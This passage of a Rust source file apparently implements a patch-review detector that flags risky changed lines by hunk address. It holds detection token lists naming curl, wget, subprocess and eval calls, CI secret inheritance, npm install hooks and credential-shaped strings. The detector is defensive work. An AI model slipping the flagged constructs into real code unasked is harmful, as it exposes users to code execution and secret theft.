// DDF integration: code-evidence risk signals with hunk addresses (plan 2026-10-30, Feature A).
// Design/status: docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md#feature-a-code-evidence-risk-signals
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fcrates--deep-diff-forge-graph--src--evidence
//! Code evidence: what the changed lines of a patch do, found in the patch alone and pointed at
//! by hunk address and line, so an agent can check each claim instead of trusting it.
//!
//! The rules that read one line live in one table, `RULES`: one signal, the side of the change it
//! reads, the view it reads (code with comments and strings blanked, or the raw line), where it
//! applies, and what it matches. The integrity signals of a Rust hunk (a panic path, a trivial
//! assertion, a stub, a skipped or a removed test) are read from the tokens of each side of the
//! hunk, across its lines (the module `rust_tokens`). Evidence is lexical ([`EVIDENCE_BASIS`]): it
//! finds tokens, it never proves a change is safe, and a construct built at run time, or one
//! the hunk shows only a part of, can hide from it.
//!
//! A section of a patch is a file here, and what is read together is first hunks of one
//! section. The parser of release 0.8.4 refuses a patch that names one path in more than one
//! section, except the orders Git applies one after the other: a change in place after a
//! section that wrote the path, and a new file after a deleted file. Plain `git apply` applies
//! the sections of such a patch to the same file, so in the reading of a patch they are also
//! one file ([`CarriedShares`]): a copy of the first with the hunks of all of them, read by
//! every reading, those that join hunks among them, within the patch's bound, and what it finds
//! is reported on the section that holds the line. Before 2026-11-18 a construct that one
//! section begins and the next ends was read in two halves, as two files, in every release
//! (seventh independent review, IR7-H-2). A section read as the only file of its patch
//! (`file_evidence`) is read alone.
//!
//! Every hunk is also read as release 0.8.4 reads it ([`HunkLabels`]): line by line, in the
//! reading of 0.8.3 and in the compiler's lexer's, and for a file the patch creates in several
//! hunks once more, carried from hunk to hunk within the patch's bound ([`CarriedShares`]), by
//! the rules of that release. What it finds is united with what the readings above find, so
//! no answer is lower than that release's.

use crate::lexical::{
    Carried, Language, Readings, RustStart, ScanState, carried_view, code_view, has_token,
    is_boundary_blocker, is_ident, rust_legacy_views, rust_shebang, rust_side, rust_white,
    scalar_reading,
};
use crate::rust_tokens;
use deep_diff_forge_core::{FileStatus, HunkId, PatchHunk, PatchLine, PatchLineKind, ReviewFile};
use std::cell::Cell;

/// The basis of the first rung: what every item carried before [`Basis`] existed, and what an
/// item found by a token on one line still carries.
pub const EVIDENCE_BASIS: &str = Basis::Lexical.label();

/// The most evidence items a file reports; the score still counts every signal found.
pub const MAX_EVIDENCE_PER_FILE: usize = 32;

/// The most text the reading carried from one hunk of a created file to the next reads in a
/// whole patch: bytes of the lines of the new side, each counted with its end. The created
/// files of a patch share it in patch order ([`CarriedShares`]): each is read together from
/// its first hunk up to the hunk that would take it past what the files before it left, and
/// each hunk from that one on alone.
const CARRIED_BYTES: usize = 256 * 1024;

/// The longest line, in bytes, the reading carried from hunk to hunk reads: the hunk that has
/// a longer line on its new side, and every hunk after it, is read alone. The cost of the
/// released JavaScript scanner grows as the square of a word's length, so this, with
/// [`CARRIED_BYTES`], is what bounds the time the carried reading takes.
const CARRIED_LINE_BYTES: usize = 512;

/// What a changed line does that a reviewer should see first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EvidenceSignal {
    /// Rust `unsafe` added.
    UnsafeAdded,
    /// A process is started (`Command::new`, `subprocess`, `child_process`, `exec.Command`).
    ProcessSpawn,
    /// A network call or download (`reqwest`, `requests`, `fetch(`, `curl`, `wget`).
    NetworkFetch,
    /// Code built and run from data (`eval(`, `exec(`, `new Function(`, shell `eval`).
    DynamicEval,
    /// A CI workflow gains a privilege (`pull_request_target`, write permissions, inherited
    /// secrets).
    CiPrivilege,
    /// Code that runs at build or install time (`build.rs`, `setup.py`, npm install hooks).
    BuildHook,
    /// Text shaped like a credential (a private key header, a cloud or forge token).
    SecretLike,
    /// A lint, type or coverage check is switched off (`#[allow(`, `# noqa`, `@ts-ignore`).
    CheckSuppressed,
    /// A test is removed.
    TestRemoved,
    /// A test is switched off where it stands (`#[ignore]`, `pytest.mark.skip`, `it.skip(`,
    /// `t.Skip(`): it still reads as a test and checks nothing.
    TestSkipped,
    /// An assertion that cannot fail (`assert!(true)`, `assert True`, `expect(true).toBe(true)`).
    TrivialAssert,
    /// A placeholder where code should be (`todo!(`, `unimplemented!(`,
    /// `raise NotImplementedError`).
    StubAdded,
    /// An error is caught and dropped: an `except` whose body is `pass`, an empty `catch` block,
    /// an empty `if err != nil` block, `_ = err`, an `Err(_)` arm that does nothing.
    ErrorSwallowed,
    /// A call that panics on failure is added (Rust `unwrap` and `expect`, called as a method
    /// or by a path, or the standard one passed as a function). It is reported in test code
    /// too: nothing in a patch proves that code is test code, and an item the hunk shows under
    /// a test attribute says so ([`Evidence::test_likely`]).
    PanicPathAdded,
}

impl EvidenceSignal {
    /// Every signal, in the order scores and output list them.
    pub const ALL: [Self; 14] = [
        Self::UnsafeAdded,
        Self::ProcessSpawn,
        Self::NetworkFetch,
        Self::DynamicEval,
        Self::CiPrivilege,
        Self::BuildHook,
        Self::SecretLike,
        Self::CheckSuppressed,
        Self::TestRemoved,
        Self::TestSkipped,
        Self::TrivialAssert,
        Self::StubAdded,
        Self::ErrorSwallowed,
        Self::PanicPathAdded,
    ];

    /// Stable snake-case label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::UnsafeAdded => "unsafe_added",
            Self::ProcessSpawn => "process_spawn",
            Self::NetworkFetch => "network_fetch",
            Self::DynamicEval => "dynamic_eval",
            Self::CiPrivilege => "ci_privilege",
            Self::BuildHook => "build_hook",
            Self::SecretLike => "secret_like",
            Self::CheckSuppressed => "check_suppressed",
            Self::TestRemoved => "test_removed",
            Self::TestSkipped => "test_skipped",
            Self::TrivialAssert => "trivial_assert",
            Self::StubAdded => "stub_added",
            Self::ErrorSwallowed => "error_swallowed",
            Self::PanicPathAdded => "panic_path_added",
        }
    }

    /// The score a file gains once for carrying this signal (the one weight table).
    #[must_use]
    pub const fn weight(self) -> u32 {
        match self {
            Self::SecretLike => 5,
            Self::UnsafeAdded | Self::ProcessSpawn | Self::DynamicEval | Self::CiPrivilege => 4,
            Self::NetworkFetch
            | Self::BuildHook
            | Self::TestRemoved
            | Self::TestSkipped
            | Self::TrivialAssert
            | Self::StubAdded
            | Self::ErrorSwallowed
            | Self::PanicPathAdded => 3,
            Self::CheckSuppressed => 2,
        }
    }

    /// Whether release 0.8.3 had this signal: the first nine of [`Self::ALL`], which is all
    /// of that release's list, in its order.
    #[must_use]
    pub const fn in_release_0_8_3(self) -> bool {
        matches!(
            self,
            Self::UnsafeAdded
                | Self::ProcessSpawn
                | Self::NetworkFetch
                | Self::DynamicEval
                | Self::CiPrivilege
                | Self::BuildHook
                | Self::SecretLike
                | Self::CheckSuppressed
                | Self::TestRemoved
        )
    }

    /// Whether the signal is about a test losing its force. Such a signal lives in test files, so
    /// a test path does not halve its weight as it does every other signal's.
    #[must_use]
    pub const fn weakens_a_test(self) -> bool {
        matches!(
            self,
            Self::TestRemoved | Self::TestSkipped | Self::TrivialAssert
        )
    }
}

/// Which side of the change a line is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Side {
    /// An added line, numbered on the new side.
    New,
    /// A removed line, numbered on the old side.
    Old,
}

impl Side {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::New => "new",
            Self::Old => "old",
        }
    }
}

/// How an evidence item was found: the rung of the evidence ladder that confirmed it. A higher
/// rung sees more than a lower one, and an item states the highest that found it.
///
/// There was a third value, `syntax_fragment`, for an item a parser confirmed, until
/// 2026-11-14: the parser is out of the evidence path (the module `rust_tokens` says why).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Basis {
    /// One changed line, comments and strings blanked, matched by token.
    Lexical,
    /// Tokens read across the lines of one side of the hunk: a changed line with its
    /// neighbours.
    Hunk,
}

impl Basis {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Lexical => "lexical",
            Self::Hunk => "hunk",
        }
    }
}

/// One piece of evidence: a signal at a line of a hunk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub signal: EvidenceSignal,
    /// The rung that found it ([`Basis`]).
    pub basis: Basis,
    /// The hunk, by id (for anchors) and by address (for machines).
    pub hunk: HunkId,
    pub address: String,
    pub side: Side,
    /// The line number on `side`.
    pub line: u32,
    /// The hunk shows this panic path inside the braces of an item whose attribute spells a
    /// test (`#[test]`, a path ending in `::test`, `#[rstest]`, `#[cfg(test)]`). It is a hint
    /// for a reader and never proof: an import can bind those names to anything, a hunk can
    /// sit under an open comment, and the braces are only counted. So the item stands, the
    /// score does not change, and what a judge sees is the same; a reader may weigh the item
    /// by it. Only ever true on [`EvidenceSignal::PanicPathAdded`].
    ///
    /// Nothing withdraws a panic path. Until 2026-11-14 a parser withdrew one that it "proved"
    /// to be inside a top-level `#[cfg(test)]` item of a file the patch creates whole. Five
    /// rounds of review each found another text that the grammar and the compiler read
    /// differently, every one compiled and run to a panic in production code (second
    /// independent review, IR2-H-1 to IR2-H-4), and that class has no end. The cost is that a
    /// panic path in a test module is reported, with this mark.
    pub test_likely: bool,
    /// Release 0.8.3 reported this item: this signal on this line of this hunk. In a Rust
    /// file that is what the reading of that release finds (`released_hits`); in any other
    /// file it is a signal that release had ([`EvidenceSignal::in_release_0_8_3`]), found in
    /// the hunk read alone, which is how that release read every hunk, by rules that have
    /// not changed since. The bounded list of a file keeps these items first
    /// ([`crate::rank::RankedFile::evidence`]); the mark is not printed.
    pub released: bool,
}

/// One finding of a hunk's scan: the side, the signal, the line, and whether the reading every
/// release up to 0.8.3 had finds it, alone or as well as another reading (a released finding;
/// `false`: only a further reading finds it). The mark travels beside the public [`Evidence`],
/// which keeps the shape it was released with ([`file_evidence_marked`]).
type Item = (Side, EvidenceSignal, u32, bool);

/// What part of a line a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum View {
    /// Comments and string contents blanked.
    Code,
    /// The line as written (a suppression lives in a comment, a secret in a string).
    Raw,
}

/// Where a rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Files of these languages.
    Languages(&'static [Language]),
    /// Any file, any language or none.
    Any,
    /// CI workflow definitions (`.github/workflows/*.yml`, `.gitlab-ci.yml`).
    CiWorkflow,
    /// Build and install scripts (`build.rs`, `setup.py`).
    BuildScript,
    /// `package.json`.
    PackageJson,
}

/// What a rule looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Match {
    /// Any of these tokens. A trailing `*` makes a token a prefix (no boundary after it).
    Tokens(&'static [&'static str]),
    /// Any line with code on it.
    AnyCode,
    /// A credential-shaped string ([`looks_like_secret`]).
    Secret,
    /// A JS import of one of these modules ([`imports_module`]).
    Imports(&'static [&'static str]),
    /// An error handler with nothing in it ([`empty_handler`]). It reads the line and the next
    /// line on the same side of the hunk, so what it finds has [`Basis::Hunk`].
    EmptyHandler,
    /// One of `heads` (a whole word, with no [`is_boundary_blocker`] before it) followed by one
    /// of `tails`, with any whitespace before the tail and between its bytes: `# [allow(` is
    /// `#` and `[allow(`.
    Spaced {
        heads: &'static [&'static str],
        tails: &'static [&'static str],
    },
}

impl Match {
    /// The rung a match of this kind stands on.
    const fn basis(self) -> Basis {
        match self {
            Self::EmptyHandler => Basis::Hunk,
            Self::Tokens(_)
            | Self::AnyCode
            | Self::Secret
            | Self::Imports(_)
            | Self::Spaced { .. } => Basis::Lexical,
        }
    }
}

#[derive(Debug, Clone, Copy)]
struct Rule {
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
}

const RUST: &[Language] = &[Language::Rust];
const PYTHON: &[Language] = &[Language::Python];
const JS: &[Language] = &[Language::JavaScript];
const GO: &[Language] = &[Language::Go];
const SHELL: &[Language] = &[Language::Shell];
const SHELL_OR_YAML: &[Language] = &[Language::Shell, Language::Yaml];

const fn rule(
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
) -> Rule {
    Rule {
        signal,
        side,
        view,
        scope,
        matches,
    }
}

use EvidenceSignal as S;

/// Every evidence rule that reads one line. A test builds one positive case per token from this
/// table, so a token cannot be added without a case that finds it. The Rust rules for a removed
/// or skipped test, a trivial assertion, a stub and a panic path are not here: they read the
/// tokens of a hunk across its lines (the module `rust_tokens`).
const RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        // whatever the spacing: `# [allow(` and `#! [allow(` are the same attributes
        Match::Spaced {
            heads: &["#"],
            tails: &["[allow(", "![allow("],
        },
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
    // A decorator is code, so a skip named in a comment or a string is not one.
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "pytest.mark.skip*",
            "pytest.mark.xfail",
            "pytest.skip(",
            "unittest.skip*",
            "self.skipTest(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "it.skip(",
            "test.skip(",
            "describe.skip(",
            "it.skipIf(",
            "test.skipIf(",
            "describe.skipIf(",
            "it.todo(",
            "test.todo(",
            "xit(",
            "xtest(",
            "xdescribe(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["t.Skip(", "t.Skipf(", "t.SkipNow("]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["assert True", "self.assertTrue(True)"]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "expect(true).toBe(true)",
            "expect(true).toEqual(true)",
            "assert(true)",
            "assert.ok(true)",
        ]),
    ),
    // A placeholder named in a message string is blanked with the string, so only the forms
    // that are code are read: JS and Go have none.
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["raise NotImplementedError"]),
    ),
    // An arm that names no error and does nothing is on one line: a token finds it.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Err(_) => {}", "Err(_) => ()"]),
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["_ = err"]),
    ),
    // A handler and its empty body are often two lines: these read the next line too.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::EmptyHandler,
    ),
];

/// The rules release 0.8.3 had for a Rust file: the entries of `RULES` at commit `d4dbc91` (the
/// signed tag `v0.8.3`) that a Rust file can admit, in their order, as they were. They read the
/// view of that release ([`legacy_hits`]) and no other view.
const LEGACY_RUST_RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        Match::Tokens(&["#[allow(", "#![allow("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["#[test]", "#[tokio::test]", "#[rstest]"]),
    ),
];

/// The rules of releases 0.8.3 and 0.8.4 as they were: the table `RULES` of commit `d4dbc91`
/// (the signed tag `v0.8.3`), which release 0.8.4 (`0a27bc2`) kept unchanged, in its order.
/// The reading of release 0.8.4 ([`HunkLabels`]) asks these and no others, so that it finds
/// what that release finds; [`LEGACY_RUST_RULES`] are the ones of them a Rust file can admit.
const RELEASED_RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        Match::Tokens(&["#[allow(", "#![allow("]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["#[test]", "#[tokio::test]", "#[rstest]"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
];

std::thread_local! {
    /// How often this thread went through every hunk of a file to learn something of the
    /// file as a whole ([`file_walks`]).
    static FILE_WALKS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
}

/// Notes one pass over every hunk of a file.
fn walked() {
    FILE_WALKS.with(|walks| walks.set(walks.get() + 1));
}

/// How many times this thread has gone through every hunk of a file to learn something of
/// the file as a whole: the language of a file whose name gives none ([`FileKinds`]) and
/// which hunks are read together ([`joined_hunks`]). For tests that hold the cost of a view:
/// a view of hunks picked by path or by address may make such a pass once for a file, and
/// never once for each hunk it shows. Round 15 asked for the language of a file in
/// [`hunk_signals_alone`], for each hunk, and a page of 2,768 hunks of a file with no
/// extension took 26 s where it had taken 0.3 s (eighth independent review, IR8-M-2); no
/// test counted.
#[doc(hidden)]
#[must_use]
pub fn file_walks() -> u64 {
    FILE_WALKS.with(std::cell::Cell::get)
}

/// The kinds a file is read as and the rules each kind admits, worked out once for the file
/// ([`FileKinds::of`]) and handed to whatever reads its hunks one at a time
/// ([`hunk_signals_alone`]).
pub struct FileKinds(Vec<(FileKind, Vec<&'static Rule>)>);

impl FileKinds {
    /// The kinds of `file`. For a file whose name gives no language this looks at the first
    /// line of every hunk (a shebang there names one), so its cost is the number of hunks
    /// of the file: a caller that reads many hunks of one file asks once.
    #[must_use]
    pub fn of(file: &ReviewFile) -> Self {
        Self(
            FileKind::readings(file)
                .into_iter()
                .map(|kind| {
                    let rules = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
                    (kind, rules)
                })
                .collect(),
        )
    }
}

/// What a file is, for rule scopes.
struct FileKind {
    language: Option<Language>,
    ci_workflow: bool,
    build_script: bool,
    package_json: bool,
}

impl FileKind {
    /// The kind release 0.8.4 reads `file` as, by the rule of every release up to it: the
    /// first of [`Self::readings`]. It looks at the first hunk alone.
    fn of(file: &ReviewFile) -> Self {
        let path = file.path.as_str();
        let name = path.rsplit('/').next().unwrap_or(path);
        // A shebang is read from the first line of a new side that starts at line 1.
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language: Language::of(path, first_line),
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    /// The kinds `file` is read as, the one release 0.8.3 read it as first. There is one,
    /// unless the file's name gives no language: then a shebang does, and no number in a
    /// hunk header says which line of the file a line of a hunk is.
    ///
    /// - First, the language by the release's rule, which is kept exactly, since it is the
    ///   floor: the shebang on the first line of the new side of the first hunk, if that
    ///   hunk's header says its new side starts at line 1. It may be no language.
    /// - Then every other language that a shebang names on the first line of the old side or
    ///   of the new side of ANY hunk. Git starts looking for a hunk at its new position and
    ///   puts it where its lines are: `@@ -4,3 +1,5 @@` whose first line is `#!/bin/sh` goes
    ///   to line 1 of a script that begins so, in silence, and so does the same hunk with
    ///   `+4` or written second in its section. The numbers are hints; the text is there.
    ///
    /// The file is read under each kind and what the readings find is united
    /// ([`file_found`]), as for every further reading. Two hunks that name two languages are
    /// two kinds. The cost is a hunk in the middle of a file with no extension whose first
    /// line reads as a shebang (a script quoted in a text): the file is then read as that
    /// language too.
    ///
    /// Round 14 took the shebang from the first hunk only where `placed_at_top` put it at
    /// the top, which rests on the header's OLD number: `@@ -4,3 +1,5 @@` then had no
    /// language at all, and a fetch and an `eval` that release 0.8.3 and round 13 report
    /// went unreported (seventh independent review, IR7-H-1). Before that the rule was the
    /// release's alone, which the other false number (`+4`) and the order of hunks defeat.
    ///
    /// For a file whose name gives no language this looks at every hunk of the file, so it
    /// is asked once for a file and never once for each of its hunks ([`FileKinds`]).
    fn readings(file: &ReviewFile) -> Vec<Self> {
        let path = file.path.as_str();
        if let Some(language) = Language::of(path, None) {
            return vec![Self::with(path, Some(language))];
        }
        walked();
        let shebang = |line: Option<&PatchLine>| {
